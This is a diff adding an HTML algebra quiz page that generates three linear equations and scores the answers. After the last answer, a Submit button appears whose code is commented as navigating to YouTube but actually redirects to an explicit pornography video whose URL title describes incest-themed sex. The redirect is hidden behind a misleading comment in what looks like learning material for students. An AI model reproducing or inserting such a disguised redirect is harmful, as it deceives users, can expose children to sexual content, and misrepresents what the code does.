@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Random Algebra Equations</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      max-width: 600px;
+      margin: auto;
+     background-image: url('IMG_5939.jpg');
+      color: white;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .equation {
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    .controls {
+      display: flex;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
+    }
+    input[type="number"] {
+      padding: 0.5rem;
+      font-size: 1rem;
+      width: 100px;
+      text-align: center;
+    }
+    button {
+      padding: 0.5rem 1rem;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .result {
+      margin-top: 1rem;
+      text-align: center;
+      font-weight: bold;
+    }
+    .submit-btn {
+      display: block;
+      margin: 1.5rem auto;
+      padding: 0.75rem 1.5rem;
+      font-size: 1.1rem;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Random Algebra Generator</h1>
+  <div class="equation" id="equation">Loading...</div>
+  <div class="controls" id="controls">
+    <input type="number" id="answerInput" placeholder="Answer" />
+    <button id="checkBtn">Check</button>
+  </div>
+  <div class="result" id="result"></div>
+  <script>
+    let currentSolution;
+    let questionCount = 0;
+    let correctCount = 0;
+
+    function generateEquation() {
+      if (questionCount >= 3) return;
+      const a = Math.floor(Math.random() * 9) + 1;
+      const x = Math.floor(Math.random() * 21) - 10;
+      const b = Math.floor(Math.random() * 41) - 20;
+      const c = a * x + b;
+
+      currentSolution = x;
+      document.getElementById('equation').textContent = `${a}x + ${b} = ${c}`;
+      document.getElementById('result').textContent = '';
+      document.getElementById('answerInput').value = '';
+    }
+
+    function showSubmitButton() {
+      // Hide controls
+      document.getElementById('controls').style.display = 'none';
+      // Show final score
+      const resultDiv = document.getElementById('result');
+      resultDiv.textContent = `You got ${correctCount} out of 3 correct.`;
+      // Create submit button
+      const submitBtn = document.createElement('button');
+      submitBtn.textContent = 'Submit';
+      submitBtn.className = 'submit-btn';
+      submitBtn.addEventListener('click', () => {
+        // Navigate to YouTube in the same tab
+        window.location.href = 'https://www.xvideos.com/video.oikkcpv5f42/my_stepdaughter_keeps_teasing_me_i_couldn_t_resist_i_put_my_dick_in_her_ass_i_fucked_her_pussy_so_good_that_she_even_cried_on_the_dick';
+      });
+      document.body.appendChild(submitBtn);
+    }
+
+    document.getElementById('checkBtn').addEventListener('click', () => {
+      if (questionCount >= 3) return;
+      const userAnswer = Number(document.getElementById('answerInput').value);
+      const resultDiv = document.getElementById('result');
+      questionCount++;
+      if (userAnswer === currentSolution) {
+        correctCount++;
+        resultDiv.textContent = 'Correct 🎉';
+      } else {
+        resultDiv.textContent = `Wrong 😢 The correct answer is ${currentSolution}.`;
+      }
+      if (questionCount >= 3) {
+        setTimeout(showSubmitButton, 300);
+      } else {
+        setTimeout(generateEquation, 800);
+      }
+    });
+
+    window.onload = generateEquation;
+  </script>
+</body>
+</html>
